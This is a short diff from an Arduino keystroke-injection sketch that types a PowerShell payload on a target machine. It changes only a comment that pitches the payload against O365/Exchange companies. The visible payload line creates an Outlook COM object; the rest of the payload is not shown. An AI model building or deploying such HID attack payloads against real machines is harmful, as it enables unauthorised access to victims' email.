@@ -25,7 +25,7 @@ void loop()
   Keyboard.release(KEY_RETURN);
   delay(200);
   //
-  // Powershell payload HERE: sample payload about works great on Microsoft Enabled O365 / Exchange Companies
+  // Powershell payload HERE: sample payload, works great on Microsoft Enabled O365 / Exchange Companies
   Keyboard.print("$Outlook = New-Object -ComObject Outlook.Application");
   delay(10);
   Keyboard.press(KEY_RETURN);
